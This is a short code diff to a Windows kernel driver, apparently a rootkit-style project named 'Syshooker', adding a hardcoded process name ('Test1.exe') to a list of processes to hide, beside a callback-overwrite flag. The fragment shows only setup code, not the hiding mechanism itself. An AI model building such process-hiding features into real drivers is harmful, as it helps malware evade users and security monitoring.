@@ -66,6 +66,10 @@ char CALLBACK_OVERWRITE_ENABLED = 0;
 extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
 	//UNREFERENCED_PARAMETER(RegistryPath);
 
+	// TODO - remove this hardcoded process hide name
+	NameNode* test = CreateNameNode(L"Test1.exe", 9);
+	SettingsNew.ProcessMagicNamesHead = test;
+
 	// IRP Routines
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = SyshookerCreateClose;
 	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SyshookerCreateClose;
